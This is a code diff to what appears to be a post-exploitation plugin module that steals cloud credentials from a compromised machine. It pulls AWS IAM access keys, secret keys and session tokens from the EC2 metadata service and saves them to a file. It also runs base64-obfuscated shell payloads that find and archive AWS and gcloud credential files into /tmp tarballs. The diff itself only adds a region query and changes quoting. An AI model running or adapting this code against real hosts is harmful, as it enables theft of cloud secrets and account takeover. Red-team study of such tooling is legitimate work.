@@ -53,6 +53,7 @@ class Module(BaseModule):
     AWS_ACCESS_KEY_ID=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
     AWS_SECRET_ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
     AWS_SESSION_TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$INSTANCE_PROFILE | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
+    AWS_DEFAULT_REGION=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)
     cat > .aws-ec2-instance <<-EOF
     AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID
     AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY
@@ -78,7 +79,7 @@ class Module(BaseModule):
 
                     # enumerate aws creds
                     payload = base64.b64encode(
-                        b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
+                        b'find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\'')
                     log("running credentials find...")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'",
@@ -87,7 +88,7 @@ class Module(BaseModule):
 
                     # create an archive of all aws creds
                     payload = base64.b64encode(
-                        b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
+                        b'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')')
                     log("payload loaded and ready")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
@@ -118,7 +119,7 @@ class Module(BaseModule):
 
                     # enumerate gcp creds
                     payload = base64.b64encode(
-                        b"find / \( -type f -a \( -name 'credentials.json' -a -path '*.config/gcloud/credentials.json' \) \)  -printf '%P\n'")
+                        b'find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\'')
                     log("running credentials find...")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_gcpcredsfind | base64 -d | /bin/bash'",
@@ -127,7 +128,7 @@ class Module(BaseModule):
 
                     # create an archive of all gcp creds
                     payload = base64.b64encode(
-                        b"tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials.json' -a -path '*.config/gcloud/credentials.json' \) \)  -printf '%P\n')")
+                        b'tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\')')
                     log("payload loaded and ready")
                     result = session.platform.run(
                         f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_gcpcreds | base64 -d | /bin/bash'",
